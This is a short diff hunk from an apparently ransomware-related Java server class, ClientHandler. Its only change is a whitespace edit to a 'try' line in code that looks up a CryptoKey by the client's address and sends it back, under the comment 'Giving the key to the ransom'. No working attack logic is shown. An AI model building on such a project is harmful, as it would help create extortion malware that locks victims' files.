@@ -38,7 +38,7 @@ public class ClientHandler extends Thread {
 
 		// Giving the key to the ransom
 		while (true) {
-			try {
+		try {
 				CryptoKey key = repository.findById(request.getRemoteAddr()).get();
 				os.writeObject(key);
 
